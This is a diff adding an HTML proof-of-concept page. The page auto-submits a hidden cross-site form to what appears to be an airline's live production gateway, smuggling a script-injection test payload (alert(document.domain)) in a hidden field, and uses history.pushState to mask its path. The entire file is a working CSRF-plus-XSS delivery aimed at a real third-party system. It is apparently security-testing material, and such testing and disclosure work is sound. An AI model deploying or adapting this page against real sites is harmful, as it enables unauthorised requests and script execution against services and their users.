@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <form enctype="text/plain" action="https://svcgw.prd.aws.united.com/" method="POST">
+    <input type="hidden" name="hello"
+      value="<script>alert(document.domain);</script>" />
+    <input type="submit" value="Submit request" />
+  </form>
+  <script>
+    history.pushState('', '', '/');
+    document.forms[0].submit();
+  </script>
+</body>
+
+</html>
